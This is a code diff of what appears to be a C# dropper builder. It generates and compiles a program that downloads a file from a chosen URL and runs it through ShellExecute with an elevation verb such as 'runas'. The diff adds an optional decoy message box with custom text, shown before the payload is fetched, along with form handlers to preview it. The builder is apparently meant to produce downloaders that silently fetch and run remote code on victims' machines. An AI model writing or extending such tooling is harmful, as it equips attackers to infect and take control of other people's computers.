@@ -216,6 +216,11 @@ class Program
                     }}
         }}
 
+        if ({(guna2CheckBox12.Checked ? "true" : "false")})
+        {{
+            MessageBox.Show(""{guna2TextBox5.Text}"", ""{guna2TextBox4.Text}"");
+        }}
+
         string remoteUri = @""{url}"";
         using (WebClient client = new WebClient())
         {{
@@ -225,14 +230,13 @@ class Program
         {{
             int result = ShellExecute(IntPtr.Zero, ""{runas}"", fileName, null, null, 1);
         }}
+
  if (consoleWindow != IntPtr.Zero)
         {{
             AllocConsole();
         }}
     }}
 }}";
-
-
 
             CodeDomProvider codeProvider = new CSharpCodeProvider();
 
@@ -277,9 +281,34 @@ class Program
             }
         }
 
-        private void guna2CheckBox8_CheckedChanged(object sender, EventArgs e)
+        private void guna2CheckBox12_CheckedChanged(object sender, EventArgs e)
         {
+            if (guna2CheckBox12.Checked)
+            {
+                this.Width = 865;
+            }
+            if (guna2CheckBox12.Checked == false)
+            {
+                this.Width = 537;
+                button5.Visible = false;
+            }
+        }
 
+        private void button4_Click(object sender, EventArgs e)
+        {
+            this.Width = 563;
+            button5.Visible = true;
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            this.Width = 865;
+            button5.Visible = false;
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show(guna2TextBox5.Text, guna2TextBox4.Text);
         }
     }
 }
